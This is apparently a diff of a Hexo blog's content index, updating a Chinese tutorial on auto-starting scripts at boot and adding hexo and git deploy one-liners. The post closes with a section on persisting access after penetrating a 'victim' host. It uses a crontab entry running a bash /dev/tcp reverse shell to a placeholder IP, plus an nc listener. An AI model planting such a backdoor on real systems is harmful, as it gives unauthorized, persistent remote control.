@@ -8,7 +8,7 @@
       <link href="/2024/12/19/%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/"/>
       <url>/2024/12/19/%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/</url>
       
-        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某些程序或者服务每次开机都要一遍遍打开终端输入命令很麻烦</p><p>说的就是你，hexo</p><h2 id="构建shell命令脚本"><a href="#构建shell命令脚本" class="headerlink" title="构建shell命令脚本"></a>构建shell命令脚本</h2><p>创建后缀名为<code>.sh</code>的脚本，设置相适应的默认启动程序</p><p>编辑脚本内容，输入shell命令</p><p>拿hexo举例(它应得的)</p><pre><code class="shell"># 转到目录下（举例）（如果把脚本放在了此目录下就不用cd了）cd \\hexo-blog\\ # 一定记得是双斜杠# 执行命令hexo s## 其他命令</code></pre><p>*你可以把所有需要启用的命令一口气放进去，只要路径正确；或者在不同路径下创建不同的sh，这样就不需要cd了</p><h2 id="定时自启动"><a href="#定时自启动" class="headerlink" title="定时自启动"></a>定时自启动</h2><p>win+R打开运行，输入<code>shell:startup</code>打开启动文件夹</p><p>将脚本的快捷方式放入其中，每次开机就能自动运行了</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="在windows系统中运行bash（如果是linux系统就可以忽略了）"><a href="#在windows系统中运行bash（如果是linux系统就可以忽略了）" class="headerlink" title="在windows系统中运行bash（如果是linux系统就可以忽略了）"></a>在windows系统中运行bash（如果是linux系统就可以忽略了）</h3><p>安装<code>git bash</code></p><p>或者安装Cygwin64作为中间层来模拟linux环境</p><p>或者启用windows自带的适用于linux的子程序</p><p>我都试了一下，建议git bash，因为更现代化，并且能直接在终端上切换</p><h3 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h3><p>找到.bashrc，修改文件</p><p>文件中添加自定义命令：</p><pre><code class="shell"># alias &lt;你的命令&gt;=&#39;&lt;原本的命令&gt;&#39;# 如alias hs=&#39;hexo s&#39;</code></pre><p>更具体的更改：<a href="https://blog.csdn.net/craftsman2020/article/details/111945949">https://blog.csdn.net/craftsman2020/article/details/111945949</a></p><h3 id="windows自定义命令"><a href="#windows自定义命令" class="headerlink" title="windows自定义命令"></a>windows自定义命令</h3><p>没有找到更好的，一般就是在用户目录下创建一个脚本，或者修改环境变量</p><h3 id="构建定时发送反弹shell的后门"><a href="#构建定时发送反弹shell的后门" class="headerlink" title="构建定时发送反弹shell的后门"></a>构建定时发送反弹shell的后门</h3><p>当你渗透达成目标一般不就这么一拍屁股走人，因为也许下次你还想来，这就要创建后门</p><p>当然，创建后门是需要承担风险的</p><p><a href="https://www.runoob.com/linux/linux-comm-crontab.html">crontab命令</a>用来定时启动程序，这里就是定时发送反弹shell</p><p>crontab file 这里的file就是创建的后门文件了</p><p>文件内容举例：</p><pre><code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><p>更多反弹shell：<a href="https://blog.csdn.net/weixin_44288604/article/details/111740527">https://blog.csdn.net/weixin_44288604/article/details/111740527</a></p><p>下次开机时，使用nc监听端口</p><pre><code>nc -lvp &lt;port&gt;</code></pre><p>受害者主机如果后门还存在，bash就会自动送上门了</p><p>windows可以下了nmap，然后用nmap自带的ncat代替</p><p>关于nc也许也另起一篇，也许挂个链接，毕竟前人之述备矣。</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某些程序或者服务每次开机都要一遍遍打开终端输入命令很麻烦</p><p>说的就是你，hexo</p><h2 id="构建shell命令脚本"><a href="#构建shell命令脚本" class="headerlink" title="构建shell命令脚本"></a>构建shell命令脚本</h2><p>创建后缀名为<code>.sh</code>的脚本，设置相适应的默认启动程序</p><p>编辑脚本内容，输入shell命令</p><p>拿hexo举例(它应得的)</p><pre><code class="shell"># 转到目录下（举例）（如果把脚本放在了此目录下就不用cd了）cd \\hexo-blog\\ # 一定记得是双斜杠# 执行命令hexo s## 其他命令</code></pre><p>*你可以把所有需要启用的命令一口气放进去，只要路径正确；或者在不同路径下创建不同的sh，这样就不需要cd了</p><p>补一个一键上传</p><pre><code class="shell">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>如果是github</p><pre><code class="shell">git add . &amp;&amp; git commit -m &quot;update&quot; &amp;&amp; git push &lt;origin&gt; &lt;master&gt;</code></pre><p>然后需要用的时候双击运行，看着命令行跑就好了，超爽的有木有</p><h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><p>win+R打开运行，输入<code>shell:startup</code>打开启动文件夹</p><p>将脚本的快捷方式放入其中，每次开机就能自动运行了</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="在windows系统中运行bash（如果是linux系统就可以忽略了）"><a href="#在windows系统中运行bash（如果是linux系统就可以忽略了）" class="headerlink" title="在windows系统中运行bash（如果是linux系统就可以忽略了）"></a>在windows系统中运行bash（如果是linux系统就可以忽略了）</h3><p>安装<code>git bash</code></p><p>或者安装Cygwin64作为中间层来模拟linux环境</p><p>或者启用windows自带的适用于linux的子程序</p><p>我都试了一下，建议git bash，因为更现代化，并且能直接在终端上切换</p><h3 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h3><p>找到.bashrc，修改文件</p><p>文件中添加自定义命令：</p><pre><code class="shell"># alias &lt;你的命令&gt;=&#39;&lt;原本的命令&gt;&#39;# 如alias hs=&#39;hexo s&#39;</code></pre><p>更具体的更改：<a href="https://blog.csdn.net/craftsman2020/article/details/111945949">https://blog.csdn.net/craftsman2020/article/details/111945949</a></p><h3 id="windows自定义命令"><a href="#windows自定义命令" class="headerlink" title="windows自定义命令"></a>windows自定义命令</h3><p>没有找到更好的，一般就是在用户目录下创建一个脚本，或者修改环境变量</p><h3 id="构建定时发送反弹shell的后门"><a href="#构建定时发送反弹shell的后门" class="headerlink" title="构建定时发送反弹shell的后门"></a>构建定时发送反弹shell的后门</h3><p>当你渗透达成目标一般不就这么一拍屁股走人，因为也许下次你还想来，这就要创建后门</p><p>当然，创建后门是需要承担风险的</p><p><a href="https://www.runoob.com/linux/linux-comm-crontab.html">crontab命令</a>用来定时启动程序，这里就是定时发送反弹shell</p><p>crontab file 这里的file就是创建的后门文件了</p><p>文件内容举例：</p><pre><code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><p>更多反弹shell：<a href="https://blog.csdn.net/weixin_44288604/article/details/111740527">https://blog.csdn.net/weixin_44288604/article/details/111740527</a></p><p>下次开机时，使用nc监听端口</p><pre><code>nc -lvp &lt;port&gt;</code></pre><p>受害者主机如果后门还存在，bash就会自动送上门了</p><p>windows可以下了nmap，然后用nmap自带的ncat代替</p><p>关于nc也许也另起一篇，也许挂个链接，毕竟前人之述备矣。</p>]]></content>
       
       
       <categories>
@@ -111,9 +111,9 @@
       
         <tags>
             
-            <tag> 日志 </tag>
-            
             <tag> github </tag>
+            
+            <tag> 日志 </tag>
             
         </tags>
       
@@ -169,9 +169,9 @@
       
         <tags>
             
-            <tag> 日志 </tag>
-            
             <tag> 后端 </tag>
+            
+            <tag> 日志 </tag>
             
         </tags>
       
